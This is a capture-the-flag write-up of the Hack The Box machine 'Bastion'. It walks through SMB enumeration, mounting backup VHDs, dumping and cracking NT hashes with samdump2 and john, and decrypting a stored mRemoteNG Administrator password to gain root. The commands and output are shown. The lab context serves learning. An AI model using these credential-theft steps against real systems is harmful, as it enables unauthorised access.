---
title: Hack The Box - Bastion
date: 2019-09-07 23:11:00 +0800
categories: [hackthebox]
tags: [smb, mremoteng, windows, ssh]
---
I found this machine a little hard at first as this was my first Windows machine and I wasn't adept at exploiting Windows. After reading various write ups and guides online, I was able to root this machine ! :) 

![](/assets/images/bastion.png){:height="414px" width="615px"}

# Configuration

The operating systems that I will be using to tackle this machine is a Kali Linux VM and a Windows Commando VM.

What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.

```bash
$ echo "10.10.10.134 bastion.htb" >> /etc/hosts
```

# Reconnaissance

Using `nmap`, we are able to determine the open ports and running services on the machine.
```bash
$ nmap -sV -sT -sC bastion.htb
Nmap scan report for bastion.htb (10.10.10.134)
Host is up (0.26s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE      VERSION
22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -39m29s, deviation: 1h09m15s, median: 29s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2019-08-17T09:30:22+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-08-17 03:30:24
|_  start_date: 2019-08-17 03:09:17

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.52 seconds

```

# Enumeration (1)

Not much can be done with the `ssh` service as we do not have any credentials on hand so lets come back to it later. As for the `smb` service, maybe we can try logging into it and see what we can find ?

```bash
$ smbclient -L bastion.htb
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	Backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC

$ smbmap -H bastion.htb -U Guest
[+] Finding open SMB ports....
[+] User SMB session establishd on bastion.htb...
[+] IP: bastion.htb:445	Name: bastion.htb                                       
	Disk                                                  	Permissions
	----                                                  	-----------
	ADMIN$                                            	    NO ACCESS
	Backups                                           	    READ, WRITE
	C$                                                	    NO ACCESS
	IPC$                                              	    READ ONLY

```

Alright, the `Backups` share seems interesting. Lets check it out.

```bash
$ smbclient //bastion.htb/Backups
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Aug 28 03:22:24 2019
  ..                                  D        0  Wed Aug 28 03:22:24 2019
  AfupChGEOm                          D        0  Wed Aug 28 03:17:54 2019
  ApQryGFzjG                          D        0  Wed Aug 28 03:19:48 2019
  gcMteSJf.exe                        A    15872  Wed Aug 28 03:22:37 2019
  hBHyUtVj.exe                        A     2500  Wed Aug 28 03:22:10 2019
  kyMeCYlTrO                          D        0  Wed Aug 28 03:17:40 2019
  note.txt                           AR      116  Tue Apr 16 06:10:09 2019
  SDT65CB.tmp                         A        0  Fri Feb 22 07:43:08 2019
  WindowsImageBackup                  D        0  Fri Feb 22 07:44:02 2019

		7735807 blocks of size 4096. 2776236 blocks available

```

Looks like someone left a `note.txt` on the share. 

```bash
smb: \> more note.txt
Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
```

At this point of time, I did not understand the meaning of this message so I simply ignored it. Another thing that caught my attention was the `WindowsImageBackup` directory.

```bash
smb: \> cd WindowsImageBackup
smb: \WindowsImageBackup\> dir
  .                                   D        0  Fri Feb 22 07:44:02 2019
  ..                                  D        0  Fri Feb 22 07:44:02 2019
  L4mpje-PC                           D        0  Fri Feb 22 07:45:32 2019

		7735807 blocks of size 4096. 2776046 blocks available
smb: \WindowsImageBackup\> cd L4mpje-PC
smb: \WindowsImageBackup\L4mpje-PC\> dir
  .                                   D        0  Fri Feb 22 07:45:32 2019
  ..                                  D        0  Fri Feb 22 07:45:32 2019
  Backup 2019-02-22 124351            D        0  Fri Feb 22 07:45:32 2019
  Catalog                             D        0  Fri Feb 22 07:45:32 2019
  MediaId                             A       16  Fri Feb 22 07:44:02 2019
  SPPMetadataCache                    D        0  Fri Feb 22 07:45:32 2019

		7735807 blocks of size 4096. 2776046 blocks available
```

Oh no this feels like a rabbit hole already but `Backup 2019-02-22 124351` seems hopeful.
```bash
smb: \WindowsImageBackup\L4mpje-PC\> cd "Backup 2019-02-22 124351"
smb: \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\> dir
  .                                                                                              D          0   Fri Feb 22 07:45:32 2019
  ..                                                                                             D          0   Fri Feb 22 07:45:32 2019
  9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd                                                       A   37761024   Fri Feb 22 07:44:03 2019
  9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd                                                       A 5418299392   Fri Feb 22 07:45:32 2019
  BackupSpecs.xml                                                                                A       1186   Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml   A       1078   Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml                                            A       8930   Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml                                      A       6542   Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml            A       2894   Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml            A       1488   Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml            A       1484   Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml            A       3844   Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml            A       3988   Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml            A       7110   Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml            A    2374620   Fri Feb 22 07:45:32 2019

		7735807 blocks of size 4096. 2776046 blocks available

```

The `.vhd` files seem worth checking out. Lets try downloading them.

```bash
smb: \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\> get 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
parallel_read returned NT_STATUS_IO_TIMEOUT
getting file \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd 
of size 37761024 as 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd SMBecho failed (NT_STATUS_INVALID_NETWORK_RESPONSE). 
The connection is disconnected now
```

What just happened ? `NT_STATUS_IO_TIMEOUT` ? Was the file too big to be transferred ? This was where I finally understood the message when it said `don't transfer the entire backup file` and the `VPN to the subsidiary office is too slow`. Seems like we can't rely on `smbclient` to retrieve the files :/ This was where it struck me to use a Windows VM. I had heard of a Offensive Windows distribution VM by FireEye and felt that it was a good chance to try it out!

After setting up the Commando VM, I attempted to access the share and it worked ! 

![](/assets/images/bastion1.png)

After downloading the `.vhd` files which tooked quite a while, I mounted both of them.

![](/assets/images/bastion2.png)

Seems like a rather normal looking Windows file system. After looking through the user folders, I was not able to find anything but I found the SAM and SYSTEM files in the `Windows\System32\config` folder. Maybe we can dump out the passwords using these files ?

Using the `samdump2` command, we were able to extract the account hashes.
```bash
$ samdump2 SYSTEM SAM -o hash.txt
$ cat hash.txt
\*disabled\* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
\*disabled\* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
```

Following up, we used `john` to cracked the NT hashes in `hash.txt` along with the `rockyou.txt` password list.
```bash
$ john --format=nt hash.txt -wordlist:/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (NT [MD4 128/128 AVX 4x3])
Remaining 1 password hash
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
bureaulampje     (L4mpje)
1g 0:00:00:01 DONE (2019-08-17 07:47) 0.5434g/s 5106Kp/s 5106Kc/s 5106KC/s buresres..burdy1
Warning: passwords printed above might not be all those cracked
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed
```

# user.txt

Bingo, we got it ! With the password `bureaulampje`, we will now attempt to login via `ssh` using `L4mpje`'s credentials. The `user.txt` resided on his Desktop.
```bash
$ ssh L4mpje@bastion.htb
L4mpje@bastion.htb's password: 

Microsoft Windows [Version 10.0.14393]                                           
(c) 2016 Microsoft Corporation. All rights reserved.   

l4mpje@BASTION C:\Users\L4mpje>cd Desktop                                        

l4mpje@BASTION C:\Users\L4mpje\Desktop>dir                                       
 Volume in drive C has no label.                                                 
 Volume Serial Number is 0CB3-C487                                               

 Directory of C:\Users\L4mpje\Desktop                                            

22-02-2019  16:27    <DIR>          .                                            
22-02-2019  16:27    <DIR>          ..                                           
23-02-2019  10:07                32 user.txt                                     
               1 File(s)             32 bytes                                    
               2 Dir(s)  11.381.809.152 bytes free

l4mpje@BASTION C:\Users\L4mpje\Desktop>more user.txt                             
9bfeXXXXXXXXXXXXXXXXXXXXXXXXXXXX

```

# Enumeration (2)

As `l4mpje`, we first checked out the installed programs.
```bash
$ dir C:\Program Files (x86)
 Volume in drive C has no label.                                                                               
 Volume Serial Number is 0CB3-C487                                                                             

 Directory of C:\Program Files (x86)                                                                           

22-02-2019  15:01    <DIR>          .                                                                          
22-02-2019  15:01    <DIR>          ..                                                                         
16-07-2016  15:23    <DIR>          Common Files                                                               
23-02-2019  10:38    <DIR>          Internet Explorer                                                          
16-07-2016  15:23    <DIR>          Microsoft.NET                                                              
22-02-2019  15:01    <DIR>          mRemoteNG                                                                  
23-02-2019  11:22    <DIR>          Windows Defender                                                           
23-02-2019  10:38    <DIR>          Windows Mail                                                               
23-02-2019  11:22    <DIR>          Windows Media Player                                                       
16-07-2016  15:23    <DIR>          Windows Multimedia Platform                                                
16-07-2016  15:23    <DIR>          Windows NT                                                                 
23-02-2019  11:22    <DIR>          Windows Photo Viewer                                                       
16-07-2016  15:23    <DIR>          Windows Portable Devices                                                   
16-07-2016  15:23    <DIR>          WindowsPowerShell                                                          
               0 File(s)              0 bytes                                                                  
              14 Dir(s)  11.404.402.688 bytes free     

```

`mRemoteNG` ? This doesn't seem like a default installed Windows program.

```bash
$ dir C:\Program Files (x86)\mRemoteNG
 Volume in drive C has no label.                                                 
 Volume Serial Number is 0CB3-C487                                               

 Directory of C:\Program Files (x86)\mRemoteNG                                   

22-02-2019  15:01    <DIR>          .                                            
22-02-2019  15:01    <DIR>          ..                                           
18-10-2018  23:31            36.208 ADTree.dll                                   
18-10-2018  23:31           346.992 AxInterop.MSTSCLib.dll                       
18-10-2018  23:31            83.824 AxInterop.WFICALib.dll                       
18-10-2018  23:31         2.243.440 BouncyCastle.Crypto.dll                      
18-10-2018  23:30            71.022 Changelog.txt                                
18-10-2018  23:30             3.224 Credits.txt                                  
22-02-2019  15:01    <DIR>          cs-CZ                                        
22-02-2019  15:01    <DIR>          de                                           
22-02-2019  15:01    <DIR>          el                                           
22-02-2019  15:01    <DIR>          en-US                                        
22-02-2019  15:01    <DIR>          es                                           
22-02-2019  15:01    <DIR>          es-AR                                        
22-02-2019  15:01    <DIR>          Firefox                                      
22-02-2019  15:01    <DIR>          fr                                           
18-10-2018  23:31         1.966.960 Geckofx-Core.dll                             
05-07-2017  01:31         4.482.560 Geckofx-Core.pdb                             
18-10-2018  23:31           143.728 Geckofx-Winforms.dll                         
05-07-2017  01:31           259.584 Geckofx-Winforms.pdb                         
22-02-2019  15:01    <DIR>          Help                                         
22-02-2019  15:01    <DIR>          hu                                           
22-02-2019  15:01    <DIR>          Icons                                        
18-10-2018  23:31           607.088 Interop.MSTSCLib.dll                         
18-10-2018  23:31           131.440 Interop.WFICALib.dll                         
22-02-2019  15:01    <DIR>          it                                           
22-02-2019  15:01    <DIR>          ja-JP                                        
22-02-2019  15:01    <DIR>          ko-KR                                        
07-10-2018  13:21            18.326 License.txt                                  
18-10-2018  23:31           283.504 log4net.dll                                  
18-10-2018  23:31           412.528 MagicLibrary.dll                             
18-10-2018  23:31         1.552.240 mRemoteNG.exe                                
07-10-2018  13:21            28.317 mRemoteNG.exe.config                         
18-10-2018  23:30         2.405.888 mRemoteNG.pdb                                
22-02-2019  15:01    <DIR>          nb-NO                                        
22-02-2019  15:01    <DIR>          nl                                           
18-10-2018  23:31           451.952 ObjectListView.dll                           
22-02-2019  15:01    <DIR>          pl                                           
22-02-2019  15:01    <DIR>          pt                                           
22-02-2019  15:01    <DIR>          pt-BR                                        
07-10-2018  13:21           707.952 PuTTYNG.exe                                  
07-10-2018  13:21               887 Readme.txt                                   
18-10-2018  23:31           415.088 Renci.SshNet.dll                             
22-02-2019  15:01    <DIR>          ru                                           
22-02-2019  15:01    <DIR>          Schemas                                      
22-02-2019  15:01    <DIR>          Themes                                       
22-02-2019  15:01    <DIR>          tr-TR                                        
22-02-2019  15:01    <DIR>          uk                                           
18-10-2018  23:31           152.432 VncSharp.dll                                 
18-10-2018  23:31           312.176 WeifenLuo.WinFormsUI.Docking.dll             
18-10-2018  23:31            55.152 WeifenLuo.WinFormsUI.Docking.ThemeVS2003.dll 
18-10-2018  23:31           168.816 WeifenLuo.WinFormsUI.Docking.ThemeVS2012.dll 
18-10-2018  23:31           217.968 WeifenLuo.WinFormsUI.Docking.ThemeVS2013.dll 
18-10-2018  23:31           243.056 WeifenLuo.WinFormsUI.Docking.ThemeVS2015.dll 
22-02-2019  15:01    <DIR>          zh-CN                                        
22-02-2019  15:01    <DIR>          zh-TW                                        
              28 File(s)     17.802.352 bytes                                    
              28 Dir(s)  11.360.325.632 bytes free                               
```

Lets see what version of `mRemoteNG` is installed by checking the `Changelog.txt`. 

```bash
1.76.11 (2018-10-18):                                                            

Fixes:                                                                           
------                                                                           
#1139: Feature "Reconnect to previously opened sessions" not working             
#1136: Putty window not maximized                                                

...
```

Seems like the version is `1.76.10`. Lets see if we can find any exploits regarding `mRemoteNG`.

![](/assets/images/bastion3.png)

I came across this [post-exploitation module](https://www.rapid7.com/db/modules/post/windows/gather/credentials/mremote) for Metasploit that harvests the credentials from mRemoteNG's password storage file. Since I did not have meterpreter session on the machine, I found some other [alternative](https://github.com/kmahyyg/mremoteng-decrypt/).

The password storage file was stored in the `%appdata%\mRemoteNG`.

```bash
$ dir %appdata%\mRemoteNG 

22-02-2019  15:03    <DIR>          .                                                                          
22-02-2019  15:03    <DIR>          ..                                                                         
22-02-2019  15:03             6.316 confCons.xml                                                               
22-02-2019  15:02             6.194 confCons.xml.20190222-1402277353.backup                                    
22-02-2019  15:02             6.206 confCons.xml.20190222-1402339071.backup                                    
22-02-2019  15:02             6.218 confCons.xml.20190222-1402379227.backup                                    
22-02-2019  15:02             6.231 confCons.xml.20190222-1403070644.backup                                    
22-02-2019  15:03             6.319 confCons.xml.20190222-1403100488.backup                                    
22-02-2019  15:03             6.318 confCons.xml.20190222-1403220026.backup                                    
22-02-2019  15:03             6.315 confCons.xml.20190222-1403261268.backup                                    
22-02-2019  15:03             6.316 confCons.xml.20190222-1403272831.backup                                    
22-02-2019  15:03             6.315 confCons.xml.20190222-1403433299.backup                                    
22-02-2019  15:03             6.316 confCons.xml.20190222-1403486580.backup                                    
22-02-2019  15:03                51 extApps.xml                                                                
17-08-2019  15:56             6.370 mRemoteNG.log                                                              
22-02-2019  15:03             2.245 pnlLayout.xml                                                              
22-02-2019  15:01    <DIR>          Themes                                                                     
              14 File(s)         77.730 bytes                                                                  
               3 Dir(s)  11.404.337.152 bytes free 

$ more %appdata%\mRemoteNG\confCons.xml
<?xml version="1.0" encoding="utf-8"?>                                                                         
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" Bl
ockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="ZSvKI7j224Gf/twXpaP5G2QFZMLr1iO1
f5JKdtIKL6eUg+eWkL5tKO886au0ofFPW0oop8R8ddXKAx4KK7sAk6AA" ConfVersion="2.6">                                   
    <Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="500e7d58-662a-44d4-aff0-3a4
f547a3fee" Username="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xD
qE4HdVmHAowVRdC7emf7lWWA10dQKiw==" Hostname="127.0.0.1" Protocol="RDP" PuttySession="Default Settings" Port="33
89" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthen
ticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Color
s16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayThemes="false" EnableFo
ntSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" RedirectPo
rts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic
" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCom
pression="CompNone" VNCEncoding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCPr
oxyPort="0" VNCProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCVi
ewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname="" RDGatewayUseConnectionCredentials="Yes" RDGate
wayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" Inheri
tDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFontSmoothing="f
alse" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" In
heritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDi
skDrives="false" InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" Inher
itRedirectSmartCards="false" InheritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false"
 InheritAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp="false" InheritRenderingEngi
ne="false" InheritUsername="false" InheritICAEncryptionStrength="false" InheritRDPAuthenticationLevel="false" I
nheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalanceInfo="false" Inherit
PreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtApp="f
alse" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="
false" InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPas
sword="false" InheritVNCColors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGate
wayUsageMethod="false" InheritRDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" Inheri
tRDGatewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatewayDomain="false" />                  
    <Node Name="L4mpje-PC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="8d3579b2-e68e-48c1-8
f0f-9ee1347c9128" Username="L4mpje" Domain="" Password="yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U
9fKRylI7NcB9QuRsZVvla8esB" Hostname="192.168.1.75" Protocol="RDP" PuttySession="Default Settings" Port="3389" C
onnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticat
ionLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bi
t" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayThemes="false" EnableFontSmo
othing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" RedirectPorts="
false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" Red
irectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompress
ion="CompNone" VNCEncoding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPo
rt="0" VNCProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnl
y="false" RDGatewayUsageMethod="Never" RDGatewayHostname="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUs
ername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" InheritDesc
ription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFontSmoothing="false"
 InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" Inherit
Password="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDri
ves="false" InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRed
irectSmartCards="false" InheritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" Inhe
ritAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp="false" InheritRenderingEngine="f
alse" InheritUsername="false" InheritICAEncryptionStrength="false" InheritRDPAuthenticationLevel="false" Inheri
tRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalanceInfo="false" InheritPreEx
tApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtApp="false"
 InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false
" InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword
="false" InheritVNCColors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUs
ageMethod="false" InheritRDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGa
tewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatewayDomain="false" />                       
</mrng:Connections> 
```

In the `<Node>` element, we see :  
```
username: Administrator  
password: aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==  
hostname: 127.0.0.1  
protocol: RDP
```

From this, we can guess that the password field contains the encrypted version of the Administrator's password. Using the `mremoteng_decrypt.py`,

```bash
$ python mremoteng_decrypt.py aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
Password: thXLHM96BeKL0ER2
```

Neat ! We got the Administrator's password !

# root.txt

Lets see if we can login into the Administrator's account via `ssh`.

```bash
ssh Administator@bastion.htb
Administrator@bastion.htb's password: 

Microsoft Windows [Version 10.0.14393]                                           
(c) 2016 Microsoft Corporation. All rights reserved.

administrator@BASTION C:\Users\Administrator>cd Desktop

administrator@BASTION C:\Users\Administrator\Desktop>dir                         
 Volume in drive C has no label.                                                 
 Volume Serial Number is 0CB3-C487                                               

 Directory of C:\Users\Administrator\Desktop                                     

23-02-2019  10:40    <DIR>          .                                            
23-02-2019  10:40    <DIR>          ..                                           
23-02-2019  10:07                32 root.txt                                     
               1 File(s)             32 bytes                                    
               2 Dir(s)  11.348.910.080 bytes free                               

administrator@BASTION C:\Users\Administrator\Desktop>more root.txt               
9588XXXXXXXXXXXXXXXXXXXXXXXXXXXX

```

### Rooted ! Thank you for reading and look forward for more writeups and articles !
